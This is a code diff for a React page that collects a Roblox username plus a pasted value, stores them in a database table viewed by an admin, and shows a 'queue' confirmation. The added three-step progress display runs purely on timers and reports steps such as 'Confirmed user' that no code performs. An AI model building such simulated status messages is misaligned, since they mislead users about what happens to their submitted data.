@@ -15,10 +15,16 @@ import { lookupRobloxUser } from "@/lib/roblox.functions";
 type PopupState =
   | "idle"
   | "confirm"
-  | "waiting"
-  | "success"
+  | "progress"
   | "already"
   | "responses";
+
+const PROGRESS_STEPS = [
+  { active: "Confirming user...", done: "Confirmed user" },
+  { active: "Putting you in the queue...", done: "Put you in the queue" },
+  { active: "Finishing...", done: "Finished" },
+] as const;
+const STEP_MS = 5000;
 
 type RobloxUser = {
   name: string;
@@ -94,6 +100,7 @@ function Index() {
   const [isAdmin, setIsAdmin] = useState(false);
   const [rows, setRows] = useState<ResponseRow[]>([]);
   const [tab, setTab] = useState<"new" | "viewed">("new");
+  const [progressStep, setProgressStep] = useState(0);
 
   const unlockFn = useServerFn(unlockResponses);
   const listFn = useServerFn(listResponses);
@@ -175,7 +182,8 @@ function Index() {
 
   const handleConfirmYes = () => {
     const answer = `${value.trim()}\n${paste.trim()}`;
-    setPopup("waiting");
+    setPopup("progress");
+    setProgressStep(0);
     supabase
       .from("queue_responses")
       .insert({ answer })
@@ -183,15 +191,24 @@ function Index() {
         if (error) console.error("Failed to save response", error.message);
       });
 
-    timerRef.current = setTimeout(() => {
-      const t = Date.now();
-      if (!isAdmin) {
-        setEnteredAt(t);
-        setNow(t);
-        localStorage.setItem(STORAGE_KEY, String(t));
+    // Advance one step at a time, then reveal the success message
+    let step = 0;
+    const advance = () => {
+      step += 1;
+      if (step < PROGRESS_STEPS.length) {
+        setProgressStep(step);
+        timerRef.current = setTimeout(advance, STEP_MS);
+      } else {
+        const t = Date.now();
+        if (!isAdmin) {
+          setEnteredAt(t);
+          setNow(t);
+          localStorage.setItem(STORAGE_KEY, String(t));
+        }
+        setProgressStep(PROGRESS_STEPS.length); // all done
       }
-      setPopup("success");
-    }, 5000);
+    };
+    timerRef.current = setTimeout(advance, STEP_MS);
   };
 
   const handleEdit = () => {
@@ -246,9 +263,11 @@ function Index() {
     await deleteFn({ data: { id } });
   };
 
+  const progressDone = progressStep >= PROGRESS_STEPS.length;
+
   const closePopup = () => {
     if (!visible) return;
-    const wasSuccess = popup === "success";
+    const wasSuccess = popup === "progress" && progressDone;
     setVisible(false);
     setTimeout(() => {
       setPopup("idle");
@@ -260,7 +279,7 @@ function Index() {
   };
 
   const showPopup = popup !== "idle";
-  const canClose = popup !== "waiting";
+  const canClose = !(popup === "progress" && !progressDone);
   const newRows = rows.filter((r) => !r.viewed);
   const viewedRows = rows.filter((r) => r.viewed);
   const shown = tab === "new" ? newRows : viewedRows;
@@ -411,7 +430,7 @@ function Index() {
             aria-label={
               popup === "confirm"
                 ? "Confirm Roblox user"
-                : popup === "waiting"
+                : popup === "progress"
                 ? "Putting you in the queue"
                 : popup === "already"
                   ? "Already in the queue"
@@ -481,12 +500,62 @@ function Index() {
                   </>
                 )}
               </div>
-            ) : popup === "waiting" ? (
-              <div className="flex flex-col items-center">
-                <Spinner />
-                <p className="mt-6 text-lg font-semibold text-foreground">
-                  Putting you in the queue...
-                </p>
+            ) : popup === "progress" ? (
+              <div className="flex flex-col">
+                <div className="flex flex-col gap-4 text-left">
+                  {PROGRESS_STEPS.map((step, i) => {
+                    const done = progressStep > i;
+                    const current = progressStep === i;
+                    return (
+                      <div key={step.active} className="flex items-center gap-3">
+                        {done ? (
+                          <CheckIcon />
+                        ) : current ? (
+                          <span
+                            className="inline-block h-6 w-6 shrink-0 animate-spin rounded-full border-[3px] border-[color:var(--primary)] border-t-transparent"
+                            aria-hidden="true"
+                          />
+                        ) : (
+                          <span
+                            className="inline-block h-6 w-6 shrink-0 rounded-full border-[3px] border-white/20"
+                            aria-hidden="true"
+                          />
+                        )}
+                        <p
+                          className={`text-lg font-semibold leading-snug ${
+                            done
+                              ? "text-muted-foreground"
+                              : current
+                                ? "text-foreground"
+                                : "text-muted-foreground/60"
+                          }`}
+                        >
+                          {done ? step.done : step.active}
+                        </p>
+                      </div>
+                    );
+                  })}
+                </div>
+
+                {progressDone && (
+                  <div className="animate-enter">
+                    <div
+                      className="mt-6 w-full border-t"
+                      style={{ borderColor: "oklch(1 0 0 / 15%)" }}
+                    />
+                    <p className="mt-6 text-center text-lg font-semibold leading-snug text-foreground">
+                      You've been put in the queue successfully! Come back after
+                      ~5h.
+                    </p>
+                    <button
+                      type="button"
+                      onClick={closePopup}
+                      className="glass-button mt-6 w-full rounded-2xl px-5 py-3.5 text-base font-semibold hover:brightness-110 active:scale-[0.98]"
+                    >
+                      Done
+                    </button>
+                  </div>
+                )}
               </div>
             ) : popup === "already" ? (
               <div className="flex flex-col items-center">
@@ -603,6 +672,28 @@ function Spinner() {
       className="inline-block h-10 w-10 animate-spin rounded-full border-4 border-[color:var(--primary)] border-t-transparent"
       style={{ backdropFilter: "blur(4px)" }}
     />
+  );
+}
+
+function CheckIcon() {
+  return (
+    <svg
+      width="24"
+      height="24"
+      viewBox="0 0 24 24"
+      className="shrink-0"
+      aria-hidden="true"
+    >
+      <circle cx="12" cy="12" r="11" fill="var(--primary)" />
+      <path
+        d="M7 12.5l3.2 3.2L17 9"
+        fill="none"
+        stroke="#fff"
+        strokeWidth="2.4"
+        strokeLinecap="round"
+        strokeLinejoin="round"
+      />
+    </svg>
   );
 }
 
